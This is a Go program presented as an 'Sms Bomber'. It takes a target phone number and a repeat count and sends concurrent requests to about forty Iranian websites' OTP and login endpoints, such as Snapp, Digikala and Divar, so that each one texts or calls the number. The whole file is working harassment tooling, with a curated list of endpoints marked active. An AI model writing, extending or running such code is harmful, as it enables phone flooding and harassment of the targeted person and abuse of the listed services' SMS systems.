package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
)

func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	jsonData, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("\033[01;31m[-] Error while encoding JSON for", url, "!\033[0m")
		ch <- http.StatusInternalServerError
		return
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("\033[01;31m[-] Error while creating request to", url, "!\033[0m", err)
		ch <- http.StatusInternalServerError
		return
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		if ctx.Err() == context.Canceled {
			fmt.Println("\033[01;33m[!] Request to", url, "canceled.\033[0m")
			ch <- 0
			return
		}
		fmt.Println("\033[01;31m[-] Error while sending request to", url, "!", err)
		ch <- http.StatusInternalServerError
		return
	}
	defer resp.Body.Close()

	ch <- resp.StatusCode
}

func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
	if err != nil {
		fmt.Println("\033[01;31m[-] Error while creating form request to", url, "!\033[0m", err)
		ch <- http.StatusInternalServerError
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		if ctx.Err() == context.Canceled {
			fmt.Println("\033[01;33m[!] Request to", url, "canceled.\033[0m")
			ch <- 0
			return
		}
		fmt.Println("\033[01;31m[-] Error while sending request to", url, "!", err)
		ch <- http.StatusInternalServerError
		return
	}
	defer resp.Body.Close()

	ch <- resp.StatusCode
}

func main() {
	clearScreen()

	fmt.Print("\033[01;32m")
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
             *@@%#            -@@@@@@.            #@@@+             
             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
              :@@*           =%@@@@@@%-   faster   *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m")

	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)
	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel()
	}()

	var wg sync.WaitGroup
	ch := make(chan int, repeatCount*40)

	for i := 0; i < repeatCount; i++ {
                // core.gapfilm.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://core.gapfilm.ir/api/v3.2/Account/Login", map[string]interface{}{
			"PhoneNo": phone,
		}, &wg, ch)  // active ✅
		// api.pindo.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.pindo.ir/v1/user/login-register/", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)  // active ✅
		// divar.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.divar.ir/v5/auth/authenticate", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)  // active ✅
		// shab.ir login-otp (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)  // active ✅
		// shab.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", map[string]interface{}{
			"mobile": phone, // Assuming the intent was {"mobile": "phone_number", "country_code": "+98"}
			"country_code": "+98",
		}, &wg, ch)  // active ✅
		//Mobinnet 
		 wg.Add(1)
		 go func(p string) {
		 	sendJSONRequest(ctx, "https://my.mobinnet.ir/api/account/SendRegisterVerificationCode", map[string]interface{}{"cellNumber": p}, &wg, ch)
		 }(phone)  // active ✅
		// api.ostadkr.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.ostadkr.com/login", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)  // active ✅
		// digikalajet.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)  // active ✅
		// iranicard.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.iranicard.ir/api/v1/register", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)  // active ✅
		// alopeyk.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://alopeyk.com/api/sms/send.php", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)  // active ✅
		// alopeyk.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.alopeyk.com/safir-service/api/v1/login", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)  // active ✅
		// pinket.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://pinket.com/api/cu/v2/phone-verification", map[string]interface{}{
			"phoneNumber": phone,
		}, &wg, ch)  // active ✅
		// otaghak.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", map[string]interface{}{
			"username": phone,
		}, &wg, ch)  // active ✅
		// banimode.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://mobapi.banimode.com/api/v2/auth/request", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)  // active ✅
		// gw.jabama.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://gw.jabama.com/api/v4/account/send-code", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)  // active ✅
		// jabama.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://taraazws.jabama.com/api/v4/account/send-code", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)  // active ✅
		// torobpay.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.torobpay.com/user/v1/login/", map[string]interface{}{
			"phone_number": phone,
		}, &wg, ch)  // active ✅
		// sheypoor.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://www.sheypoor.com/api/v10.0.0/auth/send", map[string]interface{}{
			"username": phone,
		}, &wg, ch)  // active ✅
		// miare.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://www.miare.ir/api/otp/driver/request/", map[string]interface{}{
			"phone_number": phone,
		}, &wg, ch)  // active ✅
		// pezeshket.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.pezeshket.com/core/v1/auth/requestCodeByMobile", map[string]interface{}{
			"mobileNumber": phone,
		}, &wg, ch)  // active ✅
		// classino.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://app.classino.com/otp/v1/api/send_otp", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)  // active ✅
		// snapp.taxi (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{
			"cellphone": phone,
		}, &wg, ch)  // active ✅
		// api.snapp.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)  // active ✅
		// snapp.market(JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{
			"cellphone": phone,
		}, &wg, ch)  // active ✅
		// digikala.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{
			"username": phone,
		}, &wg, ch)  // active ✅
		// ponisha.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.ponisha.ir/api/v1/auth/register", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)  // active ✅
		// bitycle.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.bitycle.com/api/account/register", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)  // active ✅
		//barghman (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://uiapi2.saapa.ir/api/otp/sendCode", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)  // active ✅
		// komodaa.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.komodaa.com/api/v2.6/loginRC/request", map[string]interface{}{
			"phone_number": phone,
		}, &wg, ch)  // active ✅
		// anargift.com auth (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://ssr.anargift.com/api/v1/auth", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)  // active ✅

		// anargift.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://ssr.anargift.com/api/v1/auth/send_code", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)  // active ✅
		// digitalsignup.snapp.ir 
		wg.Add(1)
		go sendJSONRequest(ctx, fmt.Sprintf("https://digitalsignup.snapp.ir/otp?method=sms_v2&cellphone=%v&_rsc=1hiza", phone), map[string]interface{}{
			"cellphone": phone,
		}, &wg, ch)  // active ✅
		// digitalsignup.snapp.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp", map[string]interface{}{
			"cellphone": phone,
		}, &wg, ch)  // active ✅
		// Snappfood
		 wg.Add(1)
		 go func(p string) {
		 	formData := url.Values{}
		 	formData.Set("cellphone", p)
		 	sendFormRequest(ctx, "https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418", formData, &wg, ch)
		 }(phone)  // active ✅
		// khodro45.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://khodro45.com/api/v2/customers/otp/", map[string]interface{}{
			"mobile": phone,
			"device_type": 2,
		}, &wg, ch)// active ✅
		// irantic.com
		wg.Add(1)
		go sendJSONRequest(ctx, "https://www.irantic.com/api/login/authenticate", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)  // active ✅
		// basalam.com
		wg.Add(1)
		go sendJSONRequest(ctx, "https://auth.basalam.com/captcha/otp-request", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)  // active ✅		
		// drnext.ir
		wg.Add(1)
		go sendJSONRequest(ctx, "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)  // active ✅
		// digikalajet.ir
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)  // active ✅
		// caropex.com
		wg.Add(1)
		go sendJSONRequest(ctx, "https://caropex.com/api/v1/user/login", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)  // active ✅
		// tetherland.com
		wg.Add(1)
		go sendJSONRequest(ctx, "https://service.tetherland.com/api/v5/login-register", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)  // active ✅
		// tandori.ir
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.tandori.ir/client/users/login", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)  // active ✅
	}

	go func() {
		wg.Wait()
		close(ch)
	}()

	for statusCode := range ch {
		if statusCode >= 400 || statusCode == 0 {
			fmt.Println("\033[01;31m[-] Error ! ")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
